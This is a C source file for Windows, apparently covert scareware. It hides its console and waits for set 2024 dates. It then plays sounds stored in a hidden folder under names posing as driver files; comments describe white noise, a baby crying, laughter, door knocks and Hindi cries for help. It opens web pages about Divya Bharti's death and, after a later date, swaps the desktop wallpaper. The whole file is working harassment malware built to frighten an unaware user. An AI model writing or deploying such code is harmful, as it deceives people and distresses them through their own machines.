#include <stdio.h>
#include <time.h>
#include <windows.h>
#include <mmsystem.h>
// int printf ( const char * format, ... );

// Define the target date (year, month, day)
#define TARGET_YEAR 2024
#define TARGET_MONTH 5
#define TARGET_DAY 13  // white noise
#define TARGET_DAY1 14 // babycrying,femalelaugh,doorknock
#define TARGET_DAY2 16 // satiish,dundhomujhe,bachaao,womujhemaardenge,  websites
#define TARGET_DAY3 6 // satiish,dundhomujhe,bachaao,womujhemaardenge,  websites
#define TARGET_MONTH2 8

int main()
{
    // int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    //      WNDCLASS wndClass = {0};
    // wndClass.lpfnWndProc = DefWindowProc;
    // wndClass.hInstance = hInstance;
    // wndClass.lpszClassName = "MyWindowClass";

    // // Register the window class
    // RegisterClass(&wndClass);

    // // Create the window
    // HWND hwnd = CreateWindow("MyWindowClass", "Hidden Console", 0, 0, 0, 0, 0, NULL, NULL, hInstance, NULL);

    // // Hide the window
    // ShowWindow(hwnd, SW_HIDE);

    HWND console;

    // to allocate the console.
    AllocConsole();

    // find the console window and link to console
    console = FindWindowA("consoleWindowClass", NULL);

    // use the ShowWindow function to show and hide the
    // console. instead of SW_HIDE, we can also use 0 in
    // arguments.
    ShowWindow(console, SW_HIDE);

    // Declare variables to store current and target time
    time_t currentTime;
    struct tm targetTime = {0};
    struct tm targetTime2 = {0};
    struct tm targetTime3 = {0};
    struct tm targetTime4 = {0};

    // Get the current time
    time(&currentTime);

    // Convert the current time to a local time
    struct tm *localTime = localtime(&currentTime);

    // Set the target time
    targetTime4.tm_year= targetTime.tm_year = targetTime2.tm_year = targetTime3.tm_year = TARGET_YEAR - 1900; // tm_year is years since 1900
    targetTime.tm_mon = targetTime2.tm_mon = targetTime3.tm_mon = TARGET_MONTH - 1;      // tm_mon is zero-based, so subtract 1
    targetTime.tm_mday = TARGET_DAY;
    targetTime2.tm_mday = TARGET_DAY1;
    targetTime3.tm_mday = TARGET_DAY2;
    targetTime4.tm_mday = TARGET_DAY3;
    targetTime4.tm_mon = TARGET_MONTH2-1;

    int random[20]={3, 5, 2, 1, 0, 3, 1, 4, 5, 2, 0, 4, 3, 2, 1, 5, 2, 1, 0, 2};
    int random3[30]={4, 4, 0, 1, 6, 2, 8, 2, 7, 8, 2, 6, 4, 3, 8, 2, 2, 3, 4, 6, 4, 1, 4, 1, 9, 3, 5, 9, 0, 2};
    int random2[30]={13, 0, 1, 4, 5, 11, 8, 2, 6, 9, 6, 10, 5, 4, 2, 6, 5, 3, 12, 8, 7, 2, 10, 7, 7, 10, 1, 13, 8, 9};
    char *sounds[] = 
    { "C:\\.Win_dll_sys\\windows_drivers\\win1.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\win2.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\win3.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\sys1.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\sys2.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\sys3.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\dll1.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\dll2.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\winsys1.txt",
    "C:\\.Win_dll_sys\\windows_drivers\\winsys2.txt"};
    char *links[14] = {
        "https://www.youtube.com/watch?v=zHeCcu3E6RA",
        "https://www.youtube.com/watch?v=ANKIh_yIIc8",
        "https://www.google.com/imgres?imgurl=https%3A%2F%2Fblogger.googleusercontent.com%2Fimg%2Fb%2FR29vZ2xl%2FAVvXsEhvbo08v-xf9XpeYwpBI5-tw2dEIIksdJsfCci61jraq6L4yM9m7xZelQn1E2TmtTIG6OpJgo9XDCnJ9Q2IBMhsIrDk3FcJN5huPiki8rR6zYfgF8ahpVdXpEjwBnAH_U8DKg-J33x6WtTYW8zAriVk3Sc23TS-kKdr3XUZfpjEwCt48iLiDw4RMXKw5Q%2Fs1200%2FYour%2520paragraph%2520text%2520-%25202023-05-17T114009.894.png&tbnid=dBFQ6WL45lKhUM&vet=12ahUKEwjRhtKXhIOGAxX42zgGHX0BB10QMygDegQIARBa..i&imgrefurl=https%3A%2F%2Fwww.banglarmukh2020.in%2F2023%2F05%2Fdivya-bharati-death-and-her-rang-movie-trial-paranormal-activity.html&docid=j-eyOMuG55EQyM&w=1200&h=630&q=divya%20bharti%20death&ved=2ahUKEwjRhtKXhIOGAxX42zgGHX0BB10QMygDegQIARBa", 
        "https://www.youtube.com/watch?v=etEFAsEs0bM",
        "https://www.youtube.com/watch?v=Gw5l-wdVWbM",
        "https://www.quora.com/Was-Salman-Khan-along-with-Sajid-Nadiadwala-involved-in-Divya-Bharati-Murder",
        "https://www.youtube.com/watch?v=uMk8whsztPA",
        "https://www.youtube.com/watch?v=mayo_A0KAu4",
        "https://www.jagran.com/entertainment/bollywood-divya-bharti-death-reason-rang-co-star-kamal-sadanah-breaks-silence-on-divya-bharti-death-says-it-was-not-a-suicide-23695731.html",
        "https://www.youtube.com/watch?v=NwgG1qigyPg",
        "https://www.youtube.com/shorts/1-GxJTZBiDM",
        "https://www.google.com/imgres?imgurl=https%3A%2F%2Flookaside.fbsbx.com%2Flookaside%2Fcrawler%2Fmedia%2F%3Fmedia_id%3D10158794532863769&tbnid=sG7Io40ke5uPcM&vet=12ahUKEwjRhtKXhIOGAxX42zgGHX0BB10QMygBegQIARBW..i&imgrefurl=https%3A%2F%2Fwww.facebook.com%2Ffb.divyabhartiportal%2Fposts%2Fwhat-exactly-happened-to-divya-that-fateful-nighta-mysterious-death-that-remain-%2F10158794533528769%2F&docid=sdRv2pfVKlZijM&w=1079&h=554&q=divya%20bharti%20death&ved=2ahUKEwjRhtKXhIOGAxX42zgGHX0BB10QMygBegQIARBW",
        "https://www.youtube.com/shorts/jAfvjp3WEXA",
        "https://en.wikipedia.org/wiki/Divya_Bharti"};
    srand(time(NULL));
    int random_number1, random_number2;
    int webtime = 600000;
    int ind=rand()%20,ind2=rand()%30;
    Sleep(webtime);

    // Compare the current time with the target time
        // Sleep(600000); // Adjust the duration as needed
    if (difftime(mktime(localTime), mktime(&targetTime4)) >0)
        {
    const wchar_t *path = L"C:\\.Win_dll_sys\\maxresdefault.txt";
    int result;
    result = SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (void *)path, SPIF_UPDATEINIFILE);
        }
        else
        {

    while(1)
    {
    if (difftime(mktime(localTime), mktime(&targetTime3)) > 0)
    {
        printf("here");
        // random_number1 = (rand() % 10);

        if (PlaySound(TEXT(sounds[random3[ind]]), NULL, SND_FILENAME | SND_ASYNC) == 0)
        {
            printf("Failed to play sound.\n");
            return 1;
        }
        ind++;
        ind%=30;
        Sleep(webtime); // Adjust the duration as needed
                     // Place your code here that you want to run after the target date
        // random_number1 = (rand() % 14);
        
        ShellExecute(NULL, "open",links[random2[ind2]] , NULL, NULL, SW_SHOWNORMAL);
        ind2++;
        ind2%=30;
    }
    else if (difftime(mktime(localTime), mktime(&targetTime2)) > 0)
    {
        // random_number1 = (rand() % 6);
            printf("second to play sound.\n");

        if (PlaySound(TEXT(sounds[random[ind]]), NULL, SND_FILENAME | SND_ASYNC) == 0)
        {
            printf("Failed to play sound.\n");
            return 1;
        }
        ind++;
        ind%=20;
        // Sleep(webtime); // Adjust the duration as needed

    }
    else if (difftime(mktime(localTime), mktime(&targetTime)) > 0)
    {
        random_number1 = (rand() % 3);

        if (PlaySound(TEXT(sounds[random_number1]), NULL, SND_FILENAME | SND_ASYNC) == 0)
        {
            printf("Failed to play sound.\n");
            return 1;
        }
        // Sleep(webtime); // Adjust the duration as needed
    }
    else
    {
        printf("Current date is on or before the target date.\n");
    }
    random_number1= (rand()%6+12);

        Sleep(random_number1*100000); // Adjust the duration as needed
    }
        }



    return 0;
}
